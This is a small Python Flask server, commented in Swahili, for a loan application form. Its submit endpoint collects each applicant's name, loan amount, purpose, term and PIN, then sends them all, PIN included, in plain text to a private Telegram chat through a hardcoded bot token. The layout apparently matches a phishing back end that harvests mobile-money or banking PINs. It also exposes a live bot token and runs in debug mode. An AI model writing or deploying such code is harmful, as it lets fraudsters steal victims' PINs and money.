from flask import Flask, request, jsonify
import requests
import random

app = Flask(__name__)

# 🔐 MIPANGILIO YA TELEGRAM
BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
CHAT_ID = "6958413637"

maombi = {}

# =========================
# KUTUMA KWENYE TELEGRAM
# =========================
def tuma_kwenye_telegram(app_id, data):

    ujumbe = f"""
MAOMBI MAPYA YA MKOPO

Namba ya Maombi: {app_id}
Jina: {data['jina']}
Kiasi: {data['kiasi']}
Lengo: {data['lengo']}
Muda: {data['muda']}
PIN: {data['pin']}
Hali: INASUBIRI (PENDING)
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": ujumbe
    })

# =========================
# HATUA YA 3 ENDPOINT
# =========================
@app.route("/submit-step3", methods=["POST"])
def wasilisha_hatua_ya_3():

    data = request.json

    app_id = str(random.randint(10000, 99999))

    maombi[app_id] = data
    maombi[app_id]["status"] = "PENDING"

    tuma_kwenye_telegram(app_id, maombi[app_id])

    return jsonify({
        "message": "imefanikiwa",
        "application_id": app_id
    })

# =========================
# KUENDESHA SERVER
# =========================
if __name__ == "__main__":
    app.run(debug=True)